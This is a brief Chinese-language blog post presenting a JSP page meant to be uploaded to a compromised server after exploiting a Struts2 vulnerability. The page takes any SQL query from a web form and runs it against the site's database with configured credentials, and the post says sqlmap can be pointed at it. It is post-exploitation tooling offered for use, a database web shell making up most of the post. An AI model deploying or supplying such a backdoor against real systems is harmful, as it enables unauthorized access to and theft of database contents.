---
layout: post
title: Jsp 数据库连接工具
---

再玩struts2漏洞的时候,传shell,找数据库配置文件，当没开外网的时候，可以直接用一下脚本。

###
    <%@ page import="java.sql.*" %>
    <%@ page import="java.util.*" %>
    <%@ page import="java.io.*" %>
    <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
    <form>
      <textarea rows="4" cols="60" name="query"></textarea></br>
      <button type="submit">executeQuery</button>
    </form>
    <%

    try {

    String sql = request.getParameter("query");
    out.println(sql+"</br>");
    String driver = ""; 
    String url = "";
    String username = "";
    String password = "";
    Class.forName(driver).newInstance();
    Connection conn = DriverManager.getConnection(url,username,password);
    
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    ResultSetMetaData rsmd = rs.getMetaData();
    int num = rsmd.getColumnCount();
    
    while(rs.next()) {
        for (int i=1; i<=num; i++){
                     
                    out.println(rs.getString(i)+"&nbsp");
           }
           out.println("</br>");
     }
   
    rs.close();
    stmt.close();
    conn.close();

    } catch (Exception e) {
      response.setStatus(200);
      e.printStackTrace();
    }


    %>
    
自己配置好了之后可以用来直接执行数据库操作，或者外连sqlmap.

